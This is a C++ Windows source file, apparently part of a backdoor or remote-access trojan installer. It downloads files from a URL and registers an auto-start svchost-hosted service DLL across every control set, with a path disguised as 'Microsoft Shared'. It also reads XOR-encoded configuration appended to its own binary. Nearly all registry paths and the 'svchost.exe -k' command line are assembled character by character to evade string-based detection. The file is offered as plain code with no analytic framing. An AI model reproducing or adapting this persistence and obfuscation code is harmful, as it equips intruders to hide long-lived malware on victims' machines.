// MyMainFunc.cpp: implementation of the MyMainFunc class.
//
//////////////////////////////////////////////////////////////////////

#include "stdafx.h"
#include "MyMainFunc.h"

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

MyMainFunc::MyMainFunc()
{

}

MyMainFunc::~MyMainFunc()
{

}

BOOL MyMainFunc::GetUrlFile(char* pUrlPath, char* m_FilePath)
{
	//初始化HTTP环境
	HINTERNET hIe = InternetOpen("", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
	if(!hIe) 
	{
		return FALSE;
	}

	//建立HTTP连接,上送数据
	HINTERNET hFp = InternetOpenUrl(hIe, pUrlPath, NULL, 0, INTERNET_FLAG_PRAGMA_NOCACHE|INTERNET_FLAG_RELOAD, 0);
	if(!hFp)
	{
		InternetCloseHandle(hIe);
		return FALSE; 
	}

	//200
	char m_TempStr[256] = {0};
	m_TempStr[0] = '2';
	m_TempStr[1] = '0';
	m_TempStr[2] = '0';
	m_TempStr[3] = 0x00;

	//查看返回码
	char sCode[256] = {0};
	DWORD nSize = 250;
	DWORD nIndex = 0;
	if(!HttpQueryInfo(hFp, HTTP_QUERY_STATUS_CODE, sCode, &nSize, &nIndex) || lstrcmp(sCode, m_TempStr))
	{
		InternetCloseHandle(hFp);
		InternetCloseHandle(hIe);
		return FALSE;
	}

	HANDLE hFile = CreateFile(m_FilePath, GENERIC_WRITE, 0, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
	if(hFile == INVALID_HANDLE_VALUE)
	{
		InternetCloseHandle(hFp);
		InternetCloseHandle(hIe);
		return FALSE;
	}
	
	BOOL bIsSuccess = FALSE;
	BYTE  pDatabuf[4096];
	DWORD dwNumberOfBytesReaded = 0;
	DWORD nWriteLen = 0;
	while(1)
	{
		if(!InternetReadFile(hFp, pDatabuf, 4000, &dwNumberOfBytesReaded))
		{
			break;
		}

		if(dwNumberOfBytesReaded == 0)
		{
			bIsSuccess = TRUE; 
			break;
		}
		else
		{
			WriteFile(hFile, pDatabuf, dwNumberOfBytesReaded, &nWriteLen, NULL);
		}
	}

	CloseHandle(hFile);
	InternetCloseHandle(hFp);
	InternetCloseHandle(hIe);
	return bIsSuccess;
}

void MyMainFunc::MakeService(LPCTSTR m_ServiceName, LPCTSTR m_ServiceView, LPCTSTR m_ServiceTitle, LPCTSTR m_DllFilePath, BOOL bIsSaveToProgramFiles)
{
	//删除原服务
	DeleteMyService(m_ServiceName);

	//注册服务
	InstallMyService(m_ServiceName, m_ServiceView);

	//修改启动项目
	ModifyService(m_ServiceName, m_ServiceTitle, m_DllFilePath, bIsSaveToProgramFiles);

	//启动服务
//	StartMyService(m_ServiceName);
}

BOOL MyMainFunc::GetFileSaveInfo(LPVOID pInfoData, DWORD nInfoLen, HINSTANCE hInst)
{
	//文件数据
	DWORD nReadLen = 0;
	char m_DllName[MAX_PATH] = {0};
	GetModuleFileName(hInst, m_DllName, 200);
	HANDLE hFile = CreateFile(m_DllName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if(hFile == INVALID_HANDLE_VALUE)
	{
		return FALSE;
	}
	DWORD nFileLen = GetFileSize(hFile, NULL);
	BYTE* pFileData = new BYTE[nFileLen];
	ReadFile(hFile, pFileData, nFileLen, &nReadLen, NULL);
	CloseHandle(hFile);

	//查找存储文件标志
	BYTE* pSaveInfo = NULL;
	for(DWORD i = nFileLen - sizeof(ULONGLONG); i > sizeof(ULONGLONG); i--)
	{
		if(*(ULONGLONG*) &pFileData[i] == PS_VER_ULONGLONG)
		{
			pSaveInfo = &pFileData[i] + sizeof(ULONGLONG);
			break;
		}
	}
	if(pSaveInfo == NULL)
	{
		delete [] pFileData;
		return FALSE;
	}

	BYTE* pKeyData = pSaveInfo + sizeof(PSDLLINFO);
	CopyMemory(pInfoData, pSaveInfo, sizeof(PSDLLINFO));

	BYTE* pSrcData = (BYTE*) pInfoData;

	//还原数据
	for(i = 0; i < sizeof(PSDLLINFO); i++)
	{
		pSrcData[i] = pSrcData[i] ^ pKeyData[i];
	}
	delete [] pFileData;

	return TRUE;
}

BOOL MyMainFunc::GetStrValue(LPCTSTR pStr, LPCTSTR pName, LPTSTR pValue)
{
	char m_Str[MAX_PATH] = {0};
	char m_Name[MAX_PATH] = {0};
	char m_Value[MAX_PATH] = {0};
	wsprintf(m_Name, "%s=", pName);
	lstrcpy(m_Str, pStr);

	char* pStart = StrStr(m_Str, pName);
	if(pStart == NULL)
	{
		return FALSE;
	}
	pStart += lstrlen(m_Name);
	
	char* pEnd = StrChr(pStart, ';');
	if(pEnd == NULL)
	{
		pEnd = m_Str + lstrlen(m_Str);
	}
	CopyMemory(pValue, pStart, (pEnd - pStart) * sizeof(char));
	pValue[pEnd - pStart] = 0;
	return TRUE;
}

BOOL MyMainFunc::MyGetKeyStr(HKEY hKey, LPCTSTR Title, LPCTSTR KeyName, BYTE* KeyValue)
{
	HKEY m_key = NULL;
	long ret = RegOpenKeyEx (	hKey,
								Title,
								0,
								KEY_ALL_ACCESS,
								&m_key
							 );
	if(ret != ERROR_SUCCESS)
	{
		return FALSE;
	}

	BYTE m_KeyValue[MAX_PATH] = {0};
	DWORD len = MAX_PATH;
	ret = RegQueryValueEx(m_key, KeyName, 0, NULL, m_KeyValue, &len);
	if(ret != ERROR_SUCCESS)
	{
		RegCloseKey(m_key);
		return FALSE;
	}
	CopyMemory(KeyValue, m_KeyValue, len);
	ret = RegCloseKey(m_key);
	if(ret != ERROR_SUCCESS)
	{
		return FALSE;
	}
	return TRUE;
}

void MyMainFunc::GetMoudleMame(DWORD pId, char* pExeName)
{
	HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pId);
    if(NULL == hProcess) 
	{
		return;
	}
	char m_ExeName[MAX_PATH] = {0};
	if(GetModuleFileNameEx(hProcess, NULL, m_ExeName, 1024) > 0)
	{
		lstrcpy(pExeName, m_ExeName);
	}
    CloseHandle(hProcess);
}

void MyMainFunc::BcdToAsc(BYTE* BcdStr, BYTE* AscStr, int Bcdlstrlen)
{
	int i, j;
	for(i = 0; i < Bcdlstrlen; i++)
	{
		j = (BcdStr[i] >> 4) & 0x0f;
                
		if(j > 9)
		{
			AscStr[2 * i] = j + 'A' - 10;
		}
		else
		{
			AscStr[2 * i] = j + '0';
		}

		j = BcdStr[i] & 0x0f;

		if(j > 9)
		{
			AscStr[2 * i + 1 ] = j + 'A' - 10;
		}
		else
		{
			AscStr[2 * i + 1] = j + '0';
		}
	}
}

BOOL MyMainFunc::MyReadFile(LPCTSTR m_FileName, LPVOID pData, DWORD nLen)
{
	HANDLE hFile = CreateFile(
			m_FileName,  
			GENERIC_READ,   
			FILE_SHARE_READ, 
			NULL,           
			OPEN_EXISTING,      
			FILE_ATTRIBUTE_NORMAL, 
			NULL);
	if(hFile == INVALID_HANDLE_VALUE)
	{
		return FALSE;
	}
	DWORD nReadLen = 0;
	ReadFile(hFile, pData, nLen, &nReadLen, NULL);
	CloseHandle(hFile);
	return TRUE;
}

void MyMainFunc::StartMyService(LPCTSTR ServiceName)
{
	//打开管理库
	SC_HANDLE hMgr = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
	if(hMgr == NULL) 
	{
		return;
	}

	//检查服务是否存在
	SC_HANDLE hSrv = OpenService(hMgr, ServiceName, SERVICE_ALL_ACCESS);
	if(hSrv == NULL)
	{
		CloseServiceHandle(hMgr);
		return;
	}

	StartService(hSrv, 0, NULL);

	//关闭数据库
	CloseServiceHandle(hSrv);
	CloseServiceHandle(hMgr);
}

int MyMainFunc::InstallMyService(LPCTSTR ServiceName, LPCTSTR ServiceView)
{
	SC_HANDLE mgr = NULL, srv = NULL;
	mgr = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
	if(!mgr) 
	{
		return -1;
	}

	//\\svchost.exe -k 
	char m_TempStr[256] = {0};
	m_TempStr[0] = '\\';
	m_TempStr[1] = 's';
	m_TempStr[2] = 'v';
	m_TempStr[3] = 'c';
	m_TempStr[4] = 'h';
	m_TempStr[5] = 'o';
	m_TempStr[6] = 's';
	m_TempStr[7] = 't';
	m_TempStr[8] = '.';
	m_TempStr[9] = 'e';
	m_TempStr[10] = 'x';
	m_TempStr[11] = 'e';
	m_TempStr[12] = ' ';
	m_TempStr[13] = '-';
	m_TempStr[14] = 'k';
	m_TempStr[15] = ' ';
	m_TempStr[16] = 0x00;

	//取EXE文件名称
	char m_DesFilePath[MAX_PATH] = {0};
	GetSystemDirectory(m_DesFilePath, 200);
	lstrcat(m_DesFilePath, m_TempStr);
	lstrcat(m_DesFilePath, ServiceName);

	//创建当前服务
	srv = CreateService(mgr, 
		ServiceName,       
		ServiceView, 
		SERVICE_ALL_ACCESS,   
		SERVICE_WIN32_OWN_PROCESS|SERVICE_INTERACTIVE_PROCESS,      
		SERVICE_AUTO_START,  
		SERVICE_ERROR_NORMAL, 
		m_DesFilePath, 
		NULL,  
		NULL,  
		NULL, 
		NULL, 
		NULL);
	if(srv) 
	{
		CloseServiceHandle(srv);
	}
	CloseServiceHandle(mgr);
	return 0;
}

int MyMainFunc::DeleteMyService(LPCTSTR ServiceName)
{
	SC_HANDLE mgr = NULL, srv = NULL;
	mgr = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
	if(!mgr) 
	{
		return -1;
	}

	//检查服务是否存在
	srv = OpenService(mgr, ServiceName, SERVICE_ALL_ACCESS);
	if(!srv)
	{
		CloseServiceHandle(mgr);
		return 0;
	}

	DeleteService(srv);
	CloseServiceHandle(srv);
	CloseServiceHandle(mgr);
	return 0;
}

void MyMainFunc::MyRegSetKeyServiceDll(char* pKeyName, char* Value)
{
	HKEY m_key = NULL;
	DWORD m_Res = 0;
	long ret = RegCreateKeyEx(	HKEY_LOCAL_MACHINE,
								pKeyName,
								0,
								NULL,
								REG_OPTION_NON_VOLATILE,
								KEY_ALL_ACCESS,
								NULL,
								&m_key,
								&m_Res
							 );
	if(ret != ERROR_SUCCESS) 
	{
		return;
	}

	//ServiceDll
	char m_TempStr[256] = {0};
	m_TempStr[0] = 'S';
	m_TempStr[1] = 'e';
	m_TempStr[2] = 'r';
	m_TempStr[3] = 'v';
	m_TempStr[4] = 'i';
	m_TempStr[5] = 'c';
	m_TempStr[6] = 'e';
	m_TempStr[7] = 'D';
	m_TempStr[8] = 'l';
	m_TempStr[9] = 'l';
	m_TempStr[10] = 0x00;

	char m_KeyValue[MAX_PATH] = {0};
	lstrcpy(m_KeyValue, Value);
	DWORD len = (lstrlen(m_KeyValue) + 1) * sizeof(char);
	ret = RegSetValueEx(m_key,
					m_TempStr,
					0,
					REG_EXPAND_SZ,
					(CONST BYTE *) m_KeyValue,
					len
				 );
	RegCloseKey(m_key);

}

void MyMainFunc::MyRegSetKeyStart(char* pKeyName, DWORD m_KeyValue)
{
	HKEY m_key = NULL;
	DWORD m_Res = 0;
	long ret = RegCreateKeyEx(	HKEY_LOCAL_MACHINE,
								pKeyName,
								0,
								NULL,
								REG_OPTION_NON_VOLATILE,
								KEY_ALL_ACCESS,
								NULL,
								&m_key,
								&m_Res
							 );
	if(ret != ERROR_SUCCESS) 
	{
		return;
	}

	//Start
	char m_TempStr[256] = {0};
	m_TempStr[0] = 'S';
	m_TempStr[1] = 't';
	m_TempStr[2] = 'a';
	m_TempStr[3] = 'r';
	m_TempStr[4] = 't';
	m_TempStr[5] = 0x00;

	DWORD len = sizeof(DWORD);
	ret = RegSetValueEx(m_key,
					m_TempStr,
					0,
					REG_DWORD,
					(CONST BYTE *) &m_KeyValue,
					len
				 );
	RegCloseKey(m_key);
}

void MyMainFunc::MyRegSetKeyDescription(char* pKeyName, LPCTSTR m_KeyValue)
{
	HKEY m_key = NULL;
	DWORD m_Res = 0;
	long ret = RegCreateKeyEx(	HKEY_LOCAL_MACHINE,
								pKeyName,
								0,
								NULL,
								REG_OPTION_NON_VOLATILE,
								KEY_ALL_ACCESS,
								NULL,
								&m_key,
								&m_Res
							 );
	if(ret != ERROR_SUCCESS) 
	{
		return;
	}

	//Description
	char m_TempStr[256] = {0};
	m_TempStr[0] = 'D';
	m_TempStr[1] = 'e';
	m_TempStr[2] = 's';
	m_TempStr[3] = 'c';
	m_TempStr[4] = 'r';
	m_TempStr[5] = 'i';
	m_TempStr[6] = 'p';
	m_TempStr[7] = 't';
	m_TempStr[8] = 'i';
	m_TempStr[9] = 'o';
	m_TempStr[10] = 'n';
	m_TempStr[11] = 0x00;

	DWORD len = (lstrlen(m_KeyValue) + 1) * sizeof(char);
	char sKeyValue[MAX_PATH] = {0};
	lstrcpy(sKeyValue, m_KeyValue);
	ret = RegSetValueEx(m_key,
					m_TempStr,
					0,
					REG_SZ,
					(CONST BYTE *) sKeyValue,
					len
				 );
	RegCloseKey(m_key);
}

void MyMainFunc::MyRegSetKeyGroup(LPCTSTR AppName)
{
	//"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SvcHost"
	char m_TmpStr[256] = {0};
	m_TmpStr[0] = 'S';
	m_TmpStr[1] = 'O';
	m_TmpStr[2] = 'F';
	m_TmpStr[3] = 'T';
	m_TmpStr[4] = 'W';
	m_TmpStr[5] = 'A';
	m_TmpStr[6] = 'R';
	m_TmpStr[7] = 'E';
	m_TmpStr[8] = '\\';
	m_TmpStr[9] = 'M';
	m_TmpStr[10] = 'i';
	m_TmpStr[11] = 'c';
	m_TmpStr[12] = 'r';
	m_TmpStr[13] = 'o';
	m_TmpStr[14] = 's';
	m_TmpStr[15] = 'o';
	m_TmpStr[16] = 'f';
	m_TmpStr[17] = 't';
	m_TmpStr[18] = '\\';
	m_TmpStr[19] = 'W';
	m_TmpStr[20] = 'i';
	m_TmpStr[21] = 'n';
	m_TmpStr[22] = 'd';
	m_TmpStr[23] = 'o';
	m_TmpStr[24] = 'w';
	m_TmpStr[25] = 's';
	m_TmpStr[26] = ' ';
	m_TmpStr[27] = 'N';
	m_TmpStr[28] = 'T';
	m_TmpStr[29] = '\\';
	m_TmpStr[30] = 'C';
	m_TmpStr[31] = 'u';
	m_TmpStr[32] = 'r';
	m_TmpStr[33] = 'r';
	m_TmpStr[34] = 'e';
	m_TmpStr[35] = 'n';
	m_TmpStr[36] = 't';
	m_TmpStr[37] = 'V';
	m_TmpStr[38] = 'e';
	m_TmpStr[39] = 'r';
	m_TmpStr[40] = 's';
	m_TmpStr[41] = 'i';
	m_TmpStr[42] = 'o';
	m_TmpStr[43] = 'n';
	m_TmpStr[44] = '\\';
	m_TmpStr[45] = 'S';
	m_TmpStr[46] = 'v';
	m_TmpStr[47] = 'c';
	m_TmpStr[48] = 'H';
	m_TmpStr[49] = 'o';
	m_TmpStr[50] = 's';
	m_TmpStr[51] = 't';

	HKEY m_key = NULL;
	DWORD m_Res = 0;
	long ret = RegCreateKeyEx(	HKEY_LOCAL_MACHINE,
								m_TmpStr,
								0,
								NULL,
								REG_OPTION_NON_VOLATILE,
								KEY_ALL_ACCESS,
								NULL,
								&m_key,
								&m_Res
							 );
	if(ret != ERROR_SUCCESS) 
	{
		return;
	}

	char m_App[MAX_PATH] = {0};
	lstrcpy(m_App, AppName);
	DWORD len = (lstrlen(AppName) + 2) * sizeof(char);
	ret = RegSetValueEx(m_key, AppName, 0, REG_MULTI_SZ, (CONST BYTE *) m_App, len);
	RegCloseKey(m_key);
}

void MyMainFunc::ModifyService(LPCTSTR ServiceName, LPCTSTR ServiceTitle, LPCTSTR DllFilePath, BOOL bIsSaveToProgramFiles)
{
	//%SystemRoot%\\System32
	char m_ImagePathSrc[256] = {0};
	m_ImagePathSrc[0] = '%';
	m_ImagePathSrc[1] = 'S';
	m_ImagePathSrc[2] = 'y';
	m_ImagePathSrc[3] = 's';
	m_ImagePathSrc[4] = 't';
	m_ImagePathSrc[5] = 'e';
	m_ImagePathSrc[6] = 'm';
	m_ImagePathSrc[7] = 'R';
	m_ImagePathSrc[8] = 'o';
	m_ImagePathSrc[9] = 'o';
	m_ImagePathSrc[10] = 't';
	m_ImagePathSrc[11] = '%';
	m_ImagePathSrc[12] = '\\';
	m_ImagePathSrc[13] = 'S';
	m_ImagePathSrc[14] = 'y';
	m_ImagePathSrc[15] = 's';
	m_ImagePathSrc[16] = 't';
	m_ImagePathSrc[17] = 'e';
	m_ImagePathSrc[18] = 'm';
	m_ImagePathSrc[19] = '3';
	m_ImagePathSrc[20] = '2';
	m_ImagePathSrc[21] = 0x00;

	if(!bIsSaveToProgramFiles)
	{
		//%SystemRoot%\\System32
		char m_TempStr[256] = {0};
		m_TempStr[0] = '%';
		m_TempStr[1] = 'S';
		m_TempStr[2] = 'y';
		m_TempStr[3] = 's';
		m_TempStr[4] = 't';
		m_TempStr[5] = 'e';
		m_TempStr[6] = 'm';
		m_TempStr[7] = 'R';
		m_TempStr[8] = 'o';
		m_TempStr[9] = 'o';
		m_TempStr[10] = 't';
		m_TempStr[11] = '%';
		m_TempStr[12] = '\\';
		m_TempStr[13] = 'S';
		m_TempStr[14] = 'y';
		m_TempStr[15] = 's';
		m_TempStr[16] = 't';
		m_TempStr[17] = 'e';
		m_TempStr[18] = 'm';
		m_TempStr[19] = '3';
		m_TempStr[20] = '2';
		m_TempStr[21] = 0x00;
		lstrcpy(m_ImagePathSrc, m_TempStr);
	}
	else
	{
		//%ProgramFiles%\\Common Files\\Microsoft Shared
		char m_TempStr[256] = {0};
		m_TempStr[0] = '%';
		m_TempStr[1] = 'P';
		m_TempStr[2] = 'r';
		m_TempStr[3] = 'o';
		m_TempStr[4] = 'g';
		m_TempStr[5] = 'r';
		m_TempStr[6] = 'a';
		m_TempStr[7] = 'm';
		m_TempStr[8] = 'F';
		m_TempStr[9] = 'i';
		m_TempStr[10] = 'l';
		m_TempStr[11] = 'e';
		m_TempStr[12] = 's';
		m_TempStr[13] = '%';
		m_TempStr[14] = '\\';
		m_TempStr[15] = 'C';
		m_TempStr[16] = 'o';
		m_TempStr[17] = 'm';
		m_TempStr[18] = 'm';
		m_TempStr[19] = 'o';
		m_TempStr[20] = 'n';
		m_TempStr[21] = ' ';
		m_TempStr[22] = 'F';
		m_TempStr[23] = 'i';
		m_TempStr[24] = 'l';
		m_TempStr[25] = 'e';
		m_TempStr[26] = 's';
		m_TempStr[27] = '\\';
		m_TempStr[28] = 'M';
		m_TempStr[29] = 'i';
		m_TempStr[30] = 'c';
		m_TempStr[31] = 'r';
		m_TempStr[32] = 'o';
		m_TempStr[33] = 's';
		m_TempStr[34] = 'o';
		m_TempStr[35] = 'f';
		m_TempStr[36] = 't';
		m_TempStr[37] = ' ';
		m_TempStr[38] = 'S';
		m_TempStr[39] = 'h';
		m_TempStr[40] = 'a';
		m_TempStr[41] = 'r';
		m_TempStr[42] = 'e';
		m_TempStr[43] = 'd';
		m_TempStr[44] = 0x00;
		lstrcpy(m_ImagePathSrc, m_TempStr);
	}

	char* pFind = strrchr(DllFilePath, '\\');
	if(pFind != NULL)
	{
		lstrcat(m_ImagePathSrc, pFind);
	}

	//SYSTEM
	char wcRoot[256] = {0};
	wcRoot[0] = 'S';
	wcRoot[1] = 'Y';
	wcRoot[2] = 'S';
	wcRoot[3] = 'T';
	wcRoot[4] = 'E';
	wcRoot[5] = 'M';
	wcRoot[6] = '\\';
	wcRoot[7] = 0x00;

	//CurrentControlSet
	char wcCurPath[256] = {0};
	wcCurPath[0] = 'C';
	wcCurPath[1] = 'u';
	wcCurPath[2] = 'r';
	wcCurPath[3] = 'r';
	wcCurPath[4] = 'e';
	wcCurPath[5] = 'n';
	wcCurPath[6] = 't';
	wcCurPath[7] = 'C';
	wcCurPath[8] = 'o';
	wcCurPath[9] = 'n';
	wcCurPath[10] = 't';
	wcCurPath[11] = 'r';
	wcCurPath[12] = 'o';
	wcCurPath[13] = 'l';
	wcCurPath[14] = 'S';
	wcCurPath[15] = 'e';
	wcCurPath[16] = 't';
	wcCurPath[17] = 0x00;

	//ControlSet001
	char wcS01Path[256] = {0};
	wcS01Path[0] = 'C';
	wcS01Path[1] = 'o';
	wcS01Path[2] = 'n';
	wcS01Path[3] = 't';
	wcS01Path[4] = 'r';
	wcS01Path[5] = 'o';
	wcS01Path[6] = 'l';
	wcS01Path[7] = 'S';
	wcS01Path[8] = 'e';
	wcS01Path[9] = 't';
	wcS01Path[10] = '0';
	wcS01Path[11] = '0';
	wcS01Path[12] = '1';
	wcS01Path[13] = 0x00;

	//ControlSet002
	char wcS02Path[256] = {0};
	wcS02Path[0] = 'C';
	wcS02Path[1] = 'o';
	wcS02Path[2] = 'n';
	wcS02Path[3] = 't';
	wcS02Path[4] = 'r';
	wcS02Path[5] = 'o';
	wcS02Path[6] = 'l';
	wcS02Path[7] = 'S';
	wcS02Path[8] = 'e';
	wcS02Path[9] = 't';
	wcS02Path[10] = '0';
	wcS02Path[11] = '0';
	wcS02Path[12] = '2';
	wcS02Path[13] = 0x00;

	//ControlSet003
	char wcS03Path[256] = {0};
	wcS03Path[0] = 'C';
	wcS03Path[1] = 'o';
	wcS03Path[2] = 'n';
	wcS03Path[3] = 't';
	wcS03Path[4] = 'r';
	wcS03Path[5] = 'o';
	wcS03Path[6] = 'l';
	wcS03Path[7] = 'S';
	wcS03Path[8] = 'e';
	wcS03Path[9] = 't';
	wcS03Path[10] = '0';
	wcS03Path[11] = '0';
	wcS03Path[12] = '3';
	wcS03Path[13] = 0x00;

	//\\Services
	char wcService[256] = {0};
	wcService[0] = '\\';
	wcService[1] = 'S';
	wcService[2] = 'e';
	wcService[3] = 'r';
	wcService[4] = 'v';
	wcService[5] = 'i';
	wcService[6] = 'c';
	wcService[7] = 'e';
	wcService[8] = 's';
	wcService[9] = '\\';
	wcService[10] = 0x00;

	//修改注册表
	char m_KeyPath[MAX_PATH] = {0};
	MyRegSetKeyGroup(ServiceName);

	char m_tmpStr[256] = {0}, m_tmpStr1[256] = {0};
	m_tmpStr[0] = '%';
	m_tmpStr[1] = 's';
	m_tmpStr[2] = '%';
	m_tmpStr[3] = 's';
	m_tmpStr[4] = '%';
	m_tmpStr[5] = 's';
	m_tmpStr[6] = '%';
	m_tmpStr[7] = 's';
	m_tmpStr[8] = '\\';
	m_tmpStr[9] = 'P';
	m_tmpStr[10] = 'a';
	m_tmpStr[11] = 'r';
	m_tmpStr[12] = 'a';
	m_tmpStr[13] = 'm';
	m_tmpStr[14] = 'e';
	m_tmpStr[15] = 't';
	m_tmpStr[16] = 'e';
	m_tmpStr[17] = 'r';
	m_tmpStr[18] = 's';
	m_tmpStr[19] = 0;

	m_tmpStr1[0] = '%';
	m_tmpStr1[1] = 's';
	m_tmpStr1[2] = '%';
	m_tmpStr1[3] = 's';
	m_tmpStr1[4] = '%';
	m_tmpStr1[5] = 's';
	m_tmpStr1[6] = '%';
	m_tmpStr1[7] = 's';

	//CurrentControlSet
	wsprintf(m_KeyPath, m_tmpStr, wcRoot, wcCurPath, wcService, ServiceName);
	MyRegSetKeyServiceDll(m_KeyPath, m_ImagePathSrc);
	wsprintf(m_KeyPath, m_tmpStr1, wcRoot, wcCurPath, wcService, ServiceName);
	MyRegSetKeyStart(m_KeyPath, 2);
	MyRegSetKeyDescription(m_KeyPath, ServiceTitle);
	
	//ControlSet001
	wsprintf(m_KeyPath, m_tmpStr, wcRoot, wcS01Path, wcService, ServiceName);
	MyRegSetKeyServiceDll(m_KeyPath, m_ImagePathSrc);
	wsprintf(m_KeyPath, m_tmpStr1, wcRoot, wcS01Path, wcService, ServiceName);
	MyRegSetKeyStart(m_KeyPath, 2);
	MyRegSetKeyDescription(m_KeyPath, ServiceTitle);

	//ControlSet002
	wsprintf(m_KeyPath, m_tmpStr, wcRoot, wcS02Path, wcService, ServiceName);
	MyRegSetKeyServiceDll(m_KeyPath, m_ImagePathSrc);
	wsprintf(m_KeyPath, m_tmpStr1, wcRoot, wcS02Path, wcService, ServiceName);
	MyRegSetKeyStart(m_KeyPath, 2);
	MyRegSetKeyDescription(m_KeyPath, ServiceTitle);

	//ControlSet003
	wsprintf(m_KeyPath, m_tmpStr, wcRoot, wcS03Path, wcService, ServiceName);
	MyRegSetKeyServiceDll(m_KeyPath, m_ImagePathSrc);
	wsprintf(m_KeyPath, m_tmpStr1, wcRoot, wcS03Path, wcService, ServiceName);
	MyRegSetKeyStart(m_KeyPath, 2);
	MyRegSetKeyDescription(m_KeyPath, ServiceTitle);
}


